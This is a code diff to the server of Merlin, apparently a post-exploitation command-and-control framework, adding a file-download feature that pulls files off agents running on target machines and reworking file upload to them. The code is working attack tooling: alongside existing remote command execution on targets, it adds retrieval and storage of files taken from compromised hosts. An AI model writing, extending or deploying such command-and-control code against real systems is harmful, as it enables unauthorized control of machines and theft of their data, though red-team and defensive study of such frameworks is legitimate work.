@@ -195,7 +195,42 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 			var p messages.AgentInfo
 			json.Unmarshal(payload, &p)
 			agentInfo(j, p)
+		case "FileTransfer":
+			var p messages.FileTransfer
+			json.Unmarshal(payload, &p)
+			if p.IsDownload {
+				agentsDir := filepath.Join(currentDir, "data", "agents")
+				_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
+				if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
+					color.Red("[!]There was an error locating the agent's directory")
+					color.Red(errD.Error())
+				}
+				color.Cyan("[+]Results for job %s", p.Job)
+				d1, err := base64.StdEncoding.DecodeString(p.FileBlob)
 
+				if err != nil {
+					color.Red("[!]There was an error decoding the fileBlob")
+					color.Red(err.Error())
+				} else {
+					d := filepath.Join(agentsDir, j.ID.String(), f)
+					errW := ioutil.WriteFile(d, d1, 0644)
+					if errW != nil {
+						color.Red("[!]There was an error writing to : %s", p.FileLocation)
+						color.Red(err.Error())
+					} else {
+						color.Green("[+]Successfully downloaded file %s with a size of %d bytes from agent to %s",
+							p.FileLocation,
+							len(d1),
+							d)
+						agents[j.ID].agentLog.WriteString(fmt.Sprintf(
+							"[%s]Successfully downloaded file %s with a size of %d bytes from agent to %s",
+							time.Now(),
+							p.FileLocation,
+							len(d1),
+							d))
+					}
+				}
+			}
 		default:
 			color.Red("[!]Invalid Activity: %s", j.Type)
 		}
@@ -413,15 +448,50 @@ func statusCheckIn(j messages.Base) messages.Base {
 
 		switch command[1] {
 		case "upload":
-			fileData := getFiledata(command[3])
-			p := messages.UploadFile{
-				Dest:     command[4],
-				FileBlob: fileData,
-				Job:      jobID,
+			uploadFile, uploadFileErr := ioutil.ReadFile(command[3])
+			if uploadFileErr != nil {
+				color.Red("[!]There was an error reading %s", command[3])
+				color.Red(uploadFileErr.Error())
+
+				m.Type = "ServerOk"
+				return m
+			} else {
+				fileHash := sha1.New()
+				io.WriteString(fileHash, string(uploadFile))
+				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Uploading file from server at %s of size %d" +
+					" bytes and SHA-1: %x to agent at %s\r\n",
+					time.Now(),
+					command[3],
+					len(uploadFile),
+					fileHash.Sum(nil),
+					command[4]))
+
+				p := messages.FileTransfer{
+					FileLocation: command[4],
+					FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
+					IsDownload:   true, // The agent will be downloading the file provided by the server in the FileBlob field
+					Job:          jobID,
+				}
+
+				k := marshalMessage(p)
+				m.Type = "FileTransfer"
+				m.Payload = (*json.RawMessage)(&k)
+
+				return m
+			}
+		case "download":
+			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Downloading file from agent at %s\n",
+				time.Now(),
+				command[3]))
+
+			p := messages.FileTransfer{
+				FileLocation:	command[3],
+				Job:      		jobID,
+				IsDownload: false,
 			}
 
 			k := marshalMessage(p)
-			m.Type = "UploadFile"
+			m.Type = "FileTransfer"
 			m.Payload = (*json.RawMessage)(&k)
 
 			return m
@@ -497,11 +567,12 @@ func usage() {
 
 	data := [][]string{
 		{"agent cmd", "<agent ID> <command>", "", "Run a command on target's operating system"},
-		{"agent upload", "<agent ID> <local_file> <target_file>", "", "Upload a file to target"},
 		{"agent control", "<agent ID> <command>", "sleep, kill, padding", "Control messages & " +
 			"functions to the agent itself"},
+		{"agent download", "<agent ID> <remote_file>", "", "Download a file from the agent to the server"},
 		{"agent info", "<agent ID>", "", "Display all information about an agent"},
 		{"agent list", "None", "", "List all checked In agents"},
+		{"agent upload", "<agent ID> <local_file> <target_file>", "", "Upload a file to target"},
 		{"exit", "None", "", "Exit the Merlin server"},
 		{"quit", "None", "", "Exit the Merlin server"},
 	}
@@ -544,6 +615,9 @@ func shell() {
 				agentCompleter,
 			),
 			readline.PcItem("upload",
+				agentCompleter,
+			),
+			readline.PcItem("download",
 				agentCompleter,
 			),
 			readline.PcItem("control",
@@ -644,18 +718,40 @@ func shell() {
 						}
 					case "upload":
 						if len(cmd) == 5 {
-							uploadStat, err := os.Stat(cmd[3])
-							if err == nil && !uploadStat.IsDir() {
-								addChannel(cmd)
-								if debug {
-									color.Red("[DEBUG] Uploading: %s to %s", cmd[3], cmd[4])
-								}
+							_, f := filepath.Split(cmd[4])
+							if f == "" {
+								color.Red("[!]A valid destination file name was not provided")
 							} else {
-								color.Red("[!] Local file : %s does not exist", cmd[3])
+								uploadFile, uploadFileErr := os.Stat(cmd[3])
+								if uploadFileErr != nil {
+									color.Red("[!]There was an error getting the FileInfo structure")
+									color.Red(uploadFileErr.Error())
+								} else if uploadFile == nil {
+									color.Red("[!]A valid source file name was not provided")
+								} else if uploadFile.IsDir(){
+									color.Red("[!]Can't upload a directory")
+								} else {
+									addChannel(cmd)
+									if debug {
+										color.Red("[DEBUG]Uploading: %s to %s", cmd[3], cmd[4])
+									}
+								}
 							}
 						} else {
-							color.Red("[!] Invalid upload command")
-							color.White("[!] USAGE: agent upload <agent ID> <local_file> <target_file>")
+							color.Red("[!]Invalid upload command")
+							color.White("[i]agent upload <agent ID> <local_file> <target_file>")
+						}
+					case "download":
+						if len(cmd) == 4 {
+							_, f := filepath.Split(cmd[3])
+							if f == ""{
+								color.Red("[!]A valid remote file name was not provided")
+							} else {
+								addChannel(cmd)
+							}
+						} else {
+							color.Red("[!]Invalid download command")
+							color.White("[i]agent download <agent ID> <remote_file>")
 						}
 					case "cmd":
 						if len(cmd) >= 4 {
@@ -773,22 +869,6 @@ func marshalMessage(m interface{}) []byte {
 		color.Red(err.Error())
 	}
 	return k
-}
-
-func getFiledata(filePath string) string {
-	dat, err := ioutil.ReadFile(filePath)
-	h := sha1.New()
-	io.WriteString(h, string(dat))
-	serverLog.WriteString(fmt.Sprintf("[%s] Uploading file: %s of size %d and sha1: % x\n",
-		time.Now(),
-		filePath,
-		len(dat),
-		h.Sum(nil)))
-	if err != nil {
-		color.Red("There was an error reading %s", filePath)
-		color.Red(err.Error())
-	}
-	return base64.StdEncoding.EncodeToString([]byte(dat))
 }
 
 func addChannel(cmd []string) {
